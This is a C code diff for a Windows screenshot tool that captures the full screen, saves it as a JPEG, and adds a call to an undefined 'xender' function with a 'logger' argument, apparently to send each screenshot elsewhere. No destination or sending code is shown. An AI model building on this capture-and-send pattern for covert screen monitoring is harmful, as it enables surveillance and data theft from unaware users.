@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include "shooter.h"
 #include "jpeglib.h"
+#include "send.h"
 
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "user32.lib")
@@ -9,7 +10,7 @@
 
 // Function to save the bitmap as a JPEG file with compression
 // Function to save the bitmap as a JPEG file with compression
-int SaveBitmapToJPEG(HBITMAP hBitmap, const char* filename, int quality) {
+int SaveBitmapToJPEG(HBITMAP hBitmap, const char* filename, int quality, char logger[]) {
     BITMAP bmp;
     BITMAPINFOHEADER bi;
     HANDLE hFile;
@@ -87,20 +88,21 @@ int SaveBitmapToJPEG(HBITMAP hBitmap, const char* filename, int quality) {
 
     // Finish the compression
     jpeg_finish_compress(&cinfo);
-    //
+    // send file
+
+    
     fclose(outfile);
 
     // Cleanup
     jpeg_destroy_compress(&cinfo);
     GlobalFree((HGLOBAL)lpBitmapData);
     DeleteDC(hdcMem);
-
     return 1;
 }
 
 
 // Function to take a screenshot and save it to a file
-void CaptureScreen(const char* filename, int quality) {
+void CaptureScreen(const char* filename, int quality, char logger[]) {
     // Get the device context for the screen
     HDC hdcScreen = GetDC(NULL);
     HDC hdcMem = CreateCompatibleDC(hdcScreen);
@@ -119,7 +121,7 @@ void CaptureScreen(const char* filename, int quality) {
     BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
 
     // Save the bitmap as a JPEG file (with compression)
-    SaveBitmapToJPEG(hBitmap, filename, quality);
+    SaveBitmapToJPEG(hBitmap, filename, quality, logger);
 
     // Clean up
   //  SelectObject(hdcMem, hOldBitmap);
@@ -128,6 +130,9 @@ void CaptureScreen(const char* filename, int quality) {
     DeleteObject(hBitmap);
 
     printf("Screenshot saved as %s\n", filename);
+
+    xender(filename, logger);
+
 }
 
 
